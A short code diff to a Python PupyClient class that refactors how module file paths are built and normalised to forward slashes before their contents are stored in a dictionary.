@@ -114,7 +114,9 @@ class PupyClient(object):
 							module_code=""
 							with open(os.path.join(root,f),'rb') as fd:
 								module_code=fd.read()
-							modules_dic[os.path.join(root[len(search_path.rstrip(os.sep))+1:].replace("\\","/"),f)]=module_code
+							modprefix = root[len(search_path.rstrip(os.sep))+1:]
+							modpath = os.path.join(modprefix,f).replace("\\","/")
+							modules_dic[modpath]=module_code
 						package_found=True
 				else: # loading a simple file
 					for ext in [".py",".pyc",".pyd"]:
